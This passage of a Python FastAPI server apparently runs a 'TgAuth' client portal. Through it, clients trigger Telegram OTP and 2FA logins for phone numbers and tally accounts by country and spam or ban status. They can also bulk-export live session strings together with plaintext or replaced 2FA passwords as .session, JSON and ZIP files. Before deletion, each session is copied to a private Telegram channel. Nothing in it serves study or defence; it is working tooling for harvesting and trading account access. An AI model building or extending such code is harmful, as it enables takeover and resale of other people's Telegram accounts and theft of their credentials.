    Updates 2FA settings, Bot Token, Admin Telegram ID, Profile Pic URL, or Default Webhook URL
    for an existing client endpoint and syncs immediately with Main Server.
    """
    if req.accept_2fa and req.reject_2fa:
        raise HTTPException(status_code=400, detail="Cannot enable both accept_2fa and reject_2fa simultaneously")

    ep_record = await verify_endpoint_ownership(client["id"], endpoint_name)

    try:
        async with httpx.AsyncClient(timeout=20.0) as http:
            resp = await http.post(
                f"{MAIN_SERVER_URL}/admin/configure-endpoint",
                json={
                    "endpoint_name": ep_record["endpoint_name"],
                    "accept_2fa": req.accept_2fa,
                    "reject_2fa": req.reject_2fa,
                    "bot_token": req.bot_token,
                    "admin_telegram_id": req.admin_telegram_id,
                    "default_webhook_url": req.default_webhook_url,
                    "profile_pic_url": req.profile_pic_url,
                },
                headers={"X-Admin-Key": MAIN_SERVER_ADMIN_KEY},
            )
            if resp.status_code != 200:
                raise HTTPException(
                    status_code=502,
                    detail=f"Main Server update failed: {resp.text[:200]}",
                )
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Main Server communication error: {str(e)}")

    async with db.pool.acquire() as conn:
        updated_row = await conn.fetchrow(
            """
            UPDATE portal_endpoints
            SET display_name = COALESCE($2, display_name),
                accept_2fa = $3,
                reject_2fa = $4,
                bot_token = $5,
                admin_telegram_id = $6,
                default_webhook_url = $7,
                profile_pic_url = $8,
                updated_at = CURRENT_TIMESTAMP
            WHERE id = $1
            RETURNING *
            """,
            ep_record["id"],
            req.display_name,
            req.accept_2fa,
            req.reject_2fa,
            req.bot_token,
            req.admin_telegram_id,
            req.default_webhook_url,
            req.profile_pic_url,
        )

    return {
        "success": True,
        "message": f"Settings for '{endpoint_name}' updated successfully",
        "endpoint": dict(updated_row),
    }


# ══════════════════════════════════════════════════════════════════
#  3. DASHBOARD ANALYTICS, COUNTRY LEADERBOARD & PROXY METRICS
# ══════════════════════════════════════════════════════════════════

@app.get("/api/client/analytics")
async def get_client_analytics(
    endpoint_name: Optional[str] = Query(None, description="Filter by specific endpoint or omit for all"),
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    Returns comprehensive non-monetary metrics for the client:
    - Total accounts received, processing, completed, failed
    - Spam/Quality status breakdown (fresh, regular, spam, banned)
    - Top Countries Leaderboard (sorted by volume)
    - Proxy Usage Metrics & Request Log counts
    """
    async with db.pool.acquire() as conn:
        if endpoint_name:
            ep = await verify_endpoint_ownership(client["id"], endpoint_name)
            ep_names = [ep["endpoint_name"]]
        else:
            rows = await conn.fetch(
                "SELECT endpoint_name FROM portal_endpoints WHERE client_id = $1 AND is_active = TRUE",
                client["id"],
            )
            ep_names = [r["endpoint_name"] for r in rows]

        # Proxy & Request Metrics from Portal DB
        proxy_stats = await conn.fetchrow(
            """
            SELECT
                COUNT(*) AS total_requests,
                COUNT(*) FILTER (WHERE action = 'request_otp') AS otp_requests,
                COUNT(*) FILTER (WHERE action = 'verify_otp' AND status = 'success') AS otp_verified,
                COUNT(*) FILTER (WHERE proxy_used = TRUE) AS proxy_requests,
                COUNT(*) FILTER (WHERE status = 'failed') AS failed_requests
            FROM portal_request_logs
            WHERE client_id = $1 AND ($2::text IS NULL OR endpoint_name = $2)
            """,
            client["id"],
            endpoint_name,
        )

        deleted_rows = await conn.fetch(
            "SELECT session_id FROM portal_account_backups WHERE client_id = $1 AND deleted_from_main = TRUE",
            client["id"],
        )
        deleted_ids = {r["session_id"] for r in deleted_rows}

    # Aggregate Accounts & Country Leaderboard from Main Server
    total_accounts = 0
    status_counts = {"completed": 0, "processing": 0, "failed": 0, "waiting_device_retry": 0, "pending": 0}
    quality_counts = {"fresh": 0, "regular": 0, "spam": 0, "banned": 0}
    country_map: Dict[str, Dict[str, Any]] = {}

    if ep_names:
        async with httpx.AsyncClient(timeout=15.0) as http:
            for ep_name in ep_names:
                try:
                    resp = await http.get(
                        f"{MAIN_SERVER_URL}/admin/accounts",
                        params={"endpoint_name": ep_name, "limit": 200, "page": 1},
                        headers={"X-Internal-Key": MAIN_SERVER_INTERNAL_KEY},
                    )
                    if resp.status_code == 200:
                        accounts = resp.json().get("accounts") or []
                        for acc in accounts:
                            if acc.get("session_id") in deleted_ids:
                                continue
                            total_accounts += 1
                            overall = acc.get("overall_processing_status") or "pending"
                            status_counts[overall] = status_counts.get(overall, 0) + 1

                            st_type = acc.get("status_type")
                            if st_type in quality_counts:
                                quality_counts[st_type] += 1

                            cc = (acc.get("country_code") or "UN").upper()
                            cname = acc.get("country_name") or cc
                            if cc not in country_map:
                                country_map[cc] = {
                                    "country_code": cc,
                                    "country_name": cname,
                                    "total": 0,
                                    "fresh": 0,
                                    "spam": 0,
                                    "banned": 0,
                                }
                            country_map[cc]["total"] += 1
                            if st_type == "fresh":
                                country_map[cc]["fresh"] += 1
                            elif st_type == "spam":
                                country_map[cc]["spam"] += 1
                            elif st_type == "banned":
                                country_map[cc]["banned"] += 1
                except Exception as e:
                    logger.warning(f"⚠️ Analytics fetch warning for endpoint {ep_name}: {e}")

    top_countries = sorted(country_map.values(), key=lambda x: x["total"], reverse=True)

    total_reqs = int(proxy_stats["total_requests"] or 0) if proxy_stats else 0
    proxy_reqs = int(proxy_stats["proxy_requests"] or 0) if proxy_stats else 0
    proxy_rate = round((proxy_reqs / total_reqs) * 100, 1) if total_reqs > 0 else 100.0

    return {
        "success": True,
        "selected_endpoint": endpoint_name or "ALL",
        "overview": {
            "total_endpoints": len(ep_names),
            "total_accounts_received": total_accounts,
            "completed_accounts": status_counts.get("completed", 0),
            "processing_accounts": status_counts.get("processing", 0) + status_counts.get("waiting_device_retry", 0),
            "failed_accounts": status_counts.get("failed", 0),
        },
        "quality_breakdown": quality_counts,
        "proxy_metrics": {
            "total_api_calls": total_reqs,
            "otp_requests_sent": int(proxy_stats["otp_requests"] or 0) if proxy_stats else 0,
            "otp_verified_count": int(proxy_stats["otp_verified"] or 0) if proxy_stats else 0,
            "proxy_routed_calls": proxy_reqs,
            "proxy_usage_percentage": proxy_rate,
        },
        "country_leaderboard": top_countries,
    }


# ══════════════════════════════════════════════════════════════════
#  4. ACCOUNTS LIST, EXPORT (.SESSION / .JSON / ZIP) & BACKUP-DELETE
# ══════════════════════════════════════════════════════════════════

@app.get("/api/client/accounts")
async def list_client_accounts(
    endpoint_name: Optional[str] = Query(None),
    search: Optional[str] = Query(None),
    country_code: Optional[str] = Query(None),
    status_type: Optional[str] = Query(None, description="fresh | regular | spam | banned"),
    overall_status: Optional[str] = Query(None, description="completed | processing | failed"),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=200),
    client: Dict[str, Any] = Depends(get_current_client),
):
    """Fetches accounts belonging strictly to the logged-in client's endpoints."""
    async with db.pool.acquire() as conn:
        if endpoint_name:
            ep = await verify_endpoint_ownership(client["id"], endpoint_name)
            ep_names = [ep["endpoint_name"]]
        else:
            rows = await conn.fetch(
                "SELECT endpoint_name FROM portal_endpoints WHERE client_id = $1 AND is_active = TRUE",
                client["id"],
            )
            ep_names = [r["endpoint_name"] for r in rows]

        deleted_rows = await conn.fetch(
            "SELECT session_id FROM portal_account_backups WHERE client_id = $1 AND deleted_from_main = TRUE",
            client["id"],
        )
        deleted_ids = {r["session_id"] for r in deleted_rows}

    if not ep_names:
        return {"success": True, "total": 0, "page": page, "accounts": []}

    combined_accounts: List[Dict[str, Any]] = []
    async with httpx.AsyncClient(timeout=15.0) as http:
        for ep_name in ep_names:
            params: Dict[str, Any] = {"endpoint_name": ep_name, "page": page, "limit": limit}
            if search:
                params["search"] = search
            if country_code:
                params["country_code"] = country_code.upper()
            if status_type:
                params["status_type"] = status_type
            if overall_status:
                params["overall_status"] = overall_status

            resp = await http.get(
                f"{MAIN_SERVER_URL}/admin/accounts",
                params=params,
                headers={"X-Internal-Key": MAIN_SERVER_INTERNAL_KEY},
            )
            if resp.status_code == 200:
                items = resp.json().get("accounts") or []
                for item in items:
                    if item.get("session_id") not in deleted_ids:
                        combined_accounts.append(item)

    return {
        "success": True,
        "total": len(combined_accounts),
        "page": page,
        "accounts": combined_accounts,
    }


async def _fetch_and_verify_account_ownership(
    session_id: str, client_id: int
) -> Dict[str, Any]:
    """Fetches full unmasked session details from Main Server and verifies endpoint ownership."""
    async with httpx.AsyncClient(timeout=15.0) as http:
        resp = await http.get(
            f"{MAIN_SERVER_URL}/admin/accounts/{session_id}/full",
            params={"reveal": "true"},
            headers={"X-Internal-Key": MAIN_SERVER_INTERNAL_KEY},
        )
        if resp.status_code != 200:
            raise HTTPException(status_code=404, detail="Session not found on Main Server")
        account = resp.json().get("account") or {}

    ep_name = account.get("endpoint_name")
    if not ep_name:
        raise HTTPException(status_code=403, detail="Account has no associated endpoint")

    await verify_endpoint_ownership(client_id, ep_name)
    return account


@app.get("/api/client/accounts/{session_id}/export")
async def export_single_account(
    session_id: str,
    format: str = Query("json", regex="^(json|session|string)$"),
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    Exports a single account in .session, .json, or plain string format.
    """
    account = await _fetch_and_verify_account_ownership(session_id, client["id"])
    sess_str = account.get("session_string")
    if not sess_str:
        raise HTTPException(status_code=400, detail="Session string is not ready or empty for this account")

    phone = str(account.get("phone_number", session_id)).replace("+", "").replace(" ", "")

    await db.log_request(
        client_id=client["id"],
        endpoint_name=account.get("endpoint_name", "unknown"),
        action=f"export_{format}",
        session_id=session_id,
        phone_number=account.get("phone_number"),
        country_code=account.get("country_code"),
        status="success",
    )

    if format == "string":
        return PlainTextResponse(
            sess_str,
            headers={"Content-Disposition": f'attachment; filename="{phone}.session.txt"'},
        )
    elif format == "session":
        return PlainTextResponse(
            sess_str,
            headers={"Content-Disposition": f'attachment; filename="{phone}.session"'},
        )
    else:
        export_json = {
            "session_id": str(account.get("session_id")),
            "phone_number": account.get("phone_number"),
            "country_code": account.get("country_code"),
            "country_name": account.get("country_name"),
            "user_id": account.get("user_id"),
            "username": account.get("username"),
            "first_name": account.get("first_name"),
            "last_name": account.get("last_name"),
            "two_fa_password": account.get("new_password") or account.get("two_fa_password"),
            "spam_status": account.get("spam_status"),
            "is_premium": account.get("is_premium"),
            "is_verified": account.get("is_verified"),
            "account_age_days": account.get("account_age_days"),
            "session_string": sess_str,
            "endpoint_name": account.get("endpoint_name"),
            "exported_at": datetime.utcnow().isoformat() + "Z",
        }
        return JSONResponse(
            export_json,
            headers={"Content-Disposition": f'attachment; filename="{phone}.json"'},
        )


@app.post("/api/client/accounts/bulk-export")
async def bulk_export_accounts(
    req: BulkSessionActionRequest,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    Exports multiple selected accounts into a single downloadable ZIP file
    containing both `{phone}.session` and `{phone}.json` for each account.
    """
    zip_buffer = io.BytesIO()
    exported_count = 0

    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for sid in req.session_ids:
            try:
                account = await _fetch_and_verify_account_ownership(sid, client["id"])
                sess_str = account.get("session_string")
                if not sess_str:
                    continue
                phone = str(account.get("phone_number", sid)).replace("+", "").replace(" ", "")
                zf.writestr(f"sessions/{phone}.session", sess_str)
                zf.writestr(
                    f"json/{phone}.json",
                    json.dumps(
                        {
                            "session_id": sid,
                            "phone_number": account.get("phone_number"),
                            "country_code": account.get("country_code"),
                            "user_id": account.get("user_id"),
                            "username": account.get("username"),
                            "first_name": account.get("first_name"),
                            "last_name": account.get("last_name"),
                            "two_fa_password": account.get("new_password") or account.get("two_fa_password"),
                            "spam_status": account.get("spam_status"),
                            "session_string": sess_str,
                        },
                        indent=2,
                        ensure_ascii=False,
                    ),
                )
                exported_count += 1
            except Exception as e:
                logger.warning(f"⚠️ Skipping session {sid} in bulk export: {e}")

    if exported_count == 0:
        raise HTTPException(status_code=400, detail="No valid sessions found to export")

    zip_buffer.seek(0)
    filename = f"tg_accounts_export_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.zip"
    return StreamingResponse(
        zip_buffer,
        media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.delete("/api/client/accounts/{session_id}")
async def backup_and_delete_account(
    session_id: str,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    CRITICAL WORKFLOW:
    1. Verifies account belongs to client.
    2. Sends full .session + client/session JSON archive to Private Telegram Channel.
    3. Only AFTER successful Telegram backup, deletes from database.
    """
    account = await _fetch_and_verify_account_ownership(session_id, client["id"])

    # Step 1: Send Backup to Private Telegram Channel
    backed_up = await backup_session_to_telegram_channel(
        session_data=account,
        client_info=client,
        reason="client_deleted_session",
    )

    if not backed_up and (BACKUP_BOT_TOKEN and BACKUP_CHAT_ID):
        raise HTTPException(
            status_code=502,
            detail="Safety Lock: Failed to send backup to Telegram private channel, so database deletion was aborted.",
        )

    # Step 2: Delete from Main Server DB if MAIN_DATABASE_URL is connected
    deleted_from_main_db = False
    if db.main_db_pool:
        try:
            async with db.main_db_pool.acquire() as mconn:
                await mconn.execute("DELETE FROM otp_attempts WHERE session_id = $1", uuid.UUID(session_id))
                await mconn.execute("DELETE FROM telegram_sessions WHERE session_id = $1", uuid.UUID(session_id))
                deleted_from_main_db = True
        except Exception as e:
            logger.error(f"⚠️ Direct Main DB delete error for {session_id}: {e}")

    # Step 3: Record in Portal Backup & Deletion Registry
    async with db.pool.acquire() as conn:
        await conn.execute(
            """
            INSERT INTO portal_account_backups
            (session_id, client_id, endpoint_name, phone_number, country_code, spam_status,
             telegram_backed_up, deleted_from_main)
            VALUES ($1, $2, $3, $4, $5, $6, $7, TRUE)
            ON CONFLICT (session_id) DO UPDATE
            SET telegram_backed_up = $7, deleted_from_main = TRUE, backed_up_at = CURRENT_TIMESTAMP
            """,
            session_id,
            client["id"],
            account.get("endpoint_name", "unknown"),
            account.get("phone_number"),
            account.get("country_code"),
            account.get("spam_status"),
            backed_up,
        )

    await db.log_request(
        client_id=client["id"],
        endpoint_name=account.get("endpoint_name", "unknown"),
        action="delete_with_backup",
        session_id=session_id,
        phone_number=account.get("phone_number"),
        country_code=account.get("country_code"),
        status="success",
    )

    return {
        "success": True,
        "message": "Account backed up to private Telegram channel and deleted from database.",
        "session_id": session_id,
        "telegram_backed_up": backed_up,
        "hard_deleted_from_main": deleted_from_main_db,
    }


# ══════════════════════════════════════════════════════════════════
#  5. CLIENT REQUEST LOGS & LIVE SANDBOX (TEST SELLING) ROUTES
# ══════════════════════════════════════════════════════════════════

@app.get("/api/client/logs")
async def get_client_request_logs(
    endpoint_name: Optional[str] = Query(None),
    action: Optional[str] = Query(None),
    limit: int = Query(50, ge=1, le=200),
    client: Dict[str, Any] = Depends(get_current_client),
):
    """Returns real-time API request logs and proxy status for the client's endpoints."""
    async with db.pool.acquire() as conn:
        if endpoint_name:
            await verify_endpoint_ownership(client["id"], endpoint_name)
            rows = await conn.fetch(
                """
                SELECT * FROM portal_request_logs
                WHERE client_id = $1 AND endpoint_name = $2
                  AND ($3::text IS NULL OR action = $3)
                ORDER BY created_at DESC LIMIT $4
                """,
                client["id"],
                endpoint_name,
                action,
                limit,
            )
        else:
            rows = await conn.fetch(
                """
                SELECT * FROM portal_request_logs
                WHERE client_id = $1 AND ($2::text IS NULL OR action = $2)
                ORDER BY created_at DESC LIMIT $3
                """,
                client["id"],
                action,
                limit,
            )

    logs = []
    for r in rows:
        d = dict(r)
        if d.get("created_at"):
            d["created_at"] = d["created_at"].isoformat()
        logs.append(d)

    return {"success": True, "total": len(logs), "logs": logs}


@app.post("/api/client/sandbox/request-otp")
async def sandbox_request_otp(
    req: SandboxOTPRequest,
    request: Request,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """
    Allows the client to test OTP sending (Test Selling) directly from the Portal UI
    using their own configured Endpoint & Client API Key.
    """
    ep = await verify_endpoint_ownership(client["id"], req.endpoint_name)
    client_ip = request.client.host if request.client else None

    async with httpx.AsyncClient(timeout=60.0) as http:
        resp = await http.post(
            f"{MAIN_SERVER_URL}/auth/request-otp",
            json={
                "phone_number": req.phone_number,
                "endpoint_name": ep["endpoint_name"],
                "client_api_key": ep["client_api_key"],
                "use_proxy": req.use_proxy,
                "country_code": req.country_code,
                "user_identifier": req.user_identifier,
                "user_identifier_type": req.user_identifier_type,
                "timeout_seconds": req.timeout_seconds,
            },
        )

    resp_json = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
    data = resp_json.get("data") or {}
    is_ok = resp.status_code == 200 and resp_json.get("success")

    await db.log_request(
        client_id=client["id"],
        endpoint_name=ep["endpoint_name"],
        action="request_otp",
        session_id=data.get("session_id"),
        phone_number=req.phone_number,
        country_code=data.get("country_code") or req.country_code,
        proxy_used=bool(data.get("proxy_used", req.use_proxy)),
        status="success" if is_ok else "failed",
        response_code=resp.status_code,
        error_message=None if is_ok else str(resp_json.get("detail") or resp.text[:200]),
        ip_address=client_ip,
    )

    if not is_ok:
        raise HTTPException(status_code=resp.status_code, detail=resp_json.get("detail") or "OTP request failed")

    return resp_json


@app.post("/api/client/sandbox/verify-otp")
async def sandbox_verify_otp(
    req: SandboxVerifyOTPRequest,
    request: Request,
    client: Dict[str, Any] = Depends(get_current_client),
):
    ep = await verify_endpoint_ownership(client["id"], req.endpoint_name)
    client_ip = request.client.host if request.client else None

    async with httpx.AsyncClient(timeout=60.0) as http:
        resp = await http.post(
            f"{MAIN_SERVER_URL}/auth/verify-otp",
            json={
                "session_id": req.session_id,
                "otp_code": req.otp_code,
            },
        )

    resp_json = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
    is_ok = resp.status_code == 200 and resp_json.get("success")

    await db.log_request(
        client_id=client["id"],
        endpoint_name=ep["endpoint_name"],
        action="verify_otp",
        session_id=req.session_id,
        status="success" if is_ok else "failed",
        response_code=resp.status_code,
        error_message=None if is_ok else str(resp_json.get("detail") or resp_json.get("message")),
        ip_address=client_ip,
    )

    if resp.status_code >= 400:
        raise HTTPException(status_code=resp.status_code, detail=resp_json.get("detail") or "OTP verification failed")

    return resp_json


@app.post("/api/client/sandbox/verify-2fa")
async def sandbox_verify_2fa(
    req: SandboxVerify2FARequest,
    request: Request,
    client: Dict[str, Any] = Depends(get_current_client),
):
    ep = await verify_endpoint_ownership(client["id"], req.endpoint_name)
    client_ip = request.client.host if request.client else None

    async with httpx.AsyncClient(timeout=60.0) as http:
        resp = await http.post(
            f"{MAIN_SERVER_URL}/auth/verify-2fa",
            json={
                "session_id": req.session_id,
                "password": req.password,
            },
        )

    resp_json = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
    is_ok = resp.status_code == 200 and resp_json.get("success")

    await db.log_request(
        client_id=client["id"],
        endpoint_name=ep["endpoint_name"],
        action="verify_2fa",
        session_id=req.session_id,
        status="success" if is_ok else "failed",
        response_code=resp.status_code,
        error_message=None if is_ok else str(resp_json.get("detail") or resp_json.get("message")),
        ip_address=client_ip,
    )

    if resp.status_code >= 400:
        raise HTTPException(status_code=resp.status_code, detail=resp_json.get("detail") or "2FA verification failed")

    return resp_json


@app.post("/api/client/sandbox/cancel-session")
async def sandbox_cancel_session(
    req: SandboxCancelRequest,
    client: Dict[str, Any] = Depends(get_current_client),
):
    ep = await verify_endpoint_ownership(client["id"], req.endpoint_name)

    async with httpx.AsyncClient(timeout=20.0) as http:
        resp = await http.post(
            f"{MAIN_SERVER_URL}/auth/cancel-session",
            json={
                "session_id": req.session_id,
                "reason": req.reason,
            },
        )

    resp_json = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
    await db.log_request(
        client_id=client["id"],
        endpoint_name=ep["endpoint_name"],
        action="cancel_session",
        session_id=req.session_id,
        status="success" if resp.status_code == 200 else "failed",
        response_code=resp.status_code,
    )

    if resp.status_code >= 400:
        raise HTTPException(status_code=resp.status_code, detail=resp_json.get("detail") or "Cancel failed")
    return resp_json


@app.get("/api/client/sandbox/status/{session_id}")
async def sandbox_check_status(
    session_id: str,
    client: Dict[str, Any] = Depends(get_current_client),
):
    """Checks real-time processing status of a sandbox session from Main Server."""
    async with httpx.AsyncClient(timeout=15.0) as http:
        resp = await http.get(
            f"{MAIN_SERVER_URL}/account/status/by-session/{session_id}",
            headers={"X-API-Key": MAIN_SERVER_API_KEY},
        )
        if resp.status_code != 200:
            raise HTTPException(status_code=resp.status_code, detail="Could not fetch session status")
        data = resp.json()

    await verify_endpoint_ownership(client["id"], data.get("endpoint_name", ""))
    return data


@app.get("/health")
async def portal_health():
    return {
        "status": "healthy",
        "service": "TgAuth Client Developer Portal Server",
        "database_connected": db.pool is not None,
        "telegram_backup_configured": bool(BACKUP_BOT_TOKEN and BACKUP_CHAT_ID),
        "main_server_url": MAIN_SERVER_URL,
        "version": "4.0.0",
    }


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", "8001")), reload=False)
```